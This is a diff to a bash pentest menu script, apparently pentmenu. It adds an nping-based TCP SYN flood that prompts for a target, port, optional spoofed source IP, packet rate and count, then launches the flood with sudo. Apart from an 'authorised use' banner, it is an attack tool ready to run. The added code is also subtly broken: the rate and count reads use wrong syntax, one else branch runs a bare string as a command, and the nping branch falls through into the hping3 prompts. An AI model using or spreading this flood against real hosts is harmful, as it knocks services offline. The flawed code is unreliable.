@@ -1,7 +1,9 @@
 #!/bin/bash
 ## create menu and show welcome message
 echo ""
-echo "Welcome to pentmenu! Please use this script responsibly!"
+echo "Hell and welcome to pentmenu!"
+echo "This software is only for responsible, authorised used."
+echo "YOU are responsible for your own actions!"
 echo ""
 options=("Show IP" "TCP SYN Flood" "TCP Port Scanner" "Quit")
 select opt in "${options[@]}"; do
@@ -15,9 +17,34 @@ select opt in "${options[@]}"; do
 	echo "External IP is detected as:"
 	curl http://canihazip.com/s/
 	echo ""
-## TCP SYN Flood DOS using hping3
+## TCP SYN Flood DOS
  	elif [ "$opt" = "TCP SYN Flood" ]; then
-	echo "TCP SYN Flood requires hping3..."
+	echo "TCP SYN Flood requires hping3...checking for hping3..."
+	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
+## No hping3 so using nping for TCP SYN Flood
+	else "hping3 not found :( trying nping instead"
+	echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
+	echo "Enter target"
+	read TARGET
+	echo "Enter target port"
+	read PORT
+	echo "Enter Source IP or use [i]nterface IP (default):"
+	read SOURCE
+	: ${SOURCE:=i}
+	echo "Enter number of packets to send per second (default is 1000):"
+	read $RATE
+	: ${RATE:=1000}
+	echo "Enter total number of packets to send (default is 10000):"
+	read $TOTAL
+	: ${TOTAL:=10000}
+	echo "Starting TCP SYN Flood..."
+	if 	[ "$SOURCE" = "i" ]; then
+	sleep 1
+	sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
+	else sleep 1 && sudo nping --tcp -p $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
+	fi
+	fi
+## Or hping3 is found, so use that for TCP SYN Flood
 	echo "Enter target"
 	read TARGET
 	echo "Enter target port"
